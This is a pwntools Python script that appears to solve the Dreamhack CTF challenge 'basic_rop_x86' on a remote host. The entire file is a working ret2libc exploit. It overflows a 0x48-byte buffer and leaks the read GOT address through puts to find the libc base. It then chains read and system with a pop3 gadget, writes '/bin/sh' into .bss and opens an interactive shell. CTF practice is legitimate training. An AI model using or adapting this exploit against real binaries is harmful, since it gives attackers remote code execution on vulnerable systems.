from pwn import *
context.log_level='debug'

hosts = 'host1.dreamhack.games'
port = 9005

p = remote(hosts,port)
elf = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')

main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
read_got = elf.got['read']
bss_addr = elf.bss()

read_offset = libc.symbols['read']
system_offset = libc.symbols['system']

pop3_ret = 0x8048689

payload = b'A'*0x48
payload += p32(puts_plt)
payload += p32(main_addr)
payload += p32(read_got)

p.sendline(payload)
recv_read_got = p.recvline()
recv_read_got = u32(recv_read_got[-5:-1])
libc_base = recv_read_got-read_offset
system_addr = libc_base+system_offset-0x70
log.info('recv_read_got : '+str(hex(recv_read_got)))
log.info('libc_base : '+str(hex(libc_base)))
log.info('system_addr : '+str(hex(system_addr)))

payload = b'A'*0x48
payload += p32(read_plt)
payload += p32(pop3_ret)
payload += p32(0)
payload += p32(bss_addr)
payload += p32(8)
payload += p32(system_addr)
payload += b'AAAA'
payload += p32(bss_addr)

p.sendline(payload)
p.send('/bin/sh\x00')

p.interactive()
